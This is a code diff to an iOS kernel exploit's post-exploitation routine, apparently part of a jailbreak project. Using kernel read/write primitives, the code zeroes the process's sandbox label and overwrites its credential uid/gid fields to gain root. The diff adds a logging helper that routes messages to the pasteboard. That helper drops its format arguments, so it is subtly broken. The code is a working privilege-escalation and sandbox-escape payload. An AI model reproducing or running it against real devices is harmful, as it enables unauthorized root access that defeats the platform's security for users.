@@ -26,18 +26,27 @@ uint64_t off_u_cr_groups = 0x28;
 uint64_t off_u_cr_rgid = 0x68;
 uint64_t off_u_cr_svgid = 0x6c;
 
+void kfd_print(char* format, ...) {
+    NSString* string = [NSString stringWithUTF8String: format];
+    if (string) {
+        [UIPasteboard generalPasteboard].string = string;
+    } else {
+        [UIPasteboard generalPasteboard].string = @"Can`t make NSString";
+    }
+}
+
 void postExploit(void) {
     uint64_t proc = getProc(getpid());
     if (proc == -1) {
-        printf("Failed to get proc\n");
         [UIPasteboard generalPasteboard].string = @"Failed to get proc";
+        kfd_print("Failed to get proc\n");
         return;
     }
-    printf("proc: 0x%llx\n", proc);
+    kfd_print("proc: 0x%llx\n", proc);
     uint64_t ucred = kread64(proc + off_p_ucred);
-    printf("ucred: 0x%llx\n", ucred);
+    kfd_print("ucred: 0x%llx\n", ucred);
     uint64_t label = kread64(ucred + off_u_cr_label);
-    printf("label: 0x%llx\n", label);
+    kfd_print("label: 0x%llx\n", label);
     //Escape Sandbox
     kwrite64(label + 0x10, 0);
     //Get Root
@@ -52,8 +61,8 @@ void postExploit(void) {
     kwrite64(ucred + off_u_cr_groups, 0);
     kwrite64(ucred + off_u_cr_rgid, 0);
     kwrite64(ucred + off_u_cr_svgid, 0);
-    printf("Done!\n");
-    [UIPasteboard generalPasteboard].string = @"Done!";
+        [UIPasteboard generalPasteboard].string = @"Done!";
+    kfd_print("Done!\n");
 }
 
 uint64_t getProc(pid_t pid) {
